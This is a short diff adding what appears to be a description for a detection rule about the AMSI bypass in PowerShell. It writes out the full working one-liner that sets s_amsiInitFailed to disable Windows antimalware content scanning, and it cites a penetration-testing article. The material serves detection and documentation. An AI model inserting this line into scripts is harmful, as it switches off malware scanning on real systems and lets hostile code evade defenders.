@@ -1,0 +1,5 @@
+Set s_amsiInitFailed to true to avoid AMSI content scan
+
+
+Attacker may bypass AMSI by adding "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)" to script.
+This attack was described in this article: http://www.labofapenetrationtester.com/2016/09/amsi.html
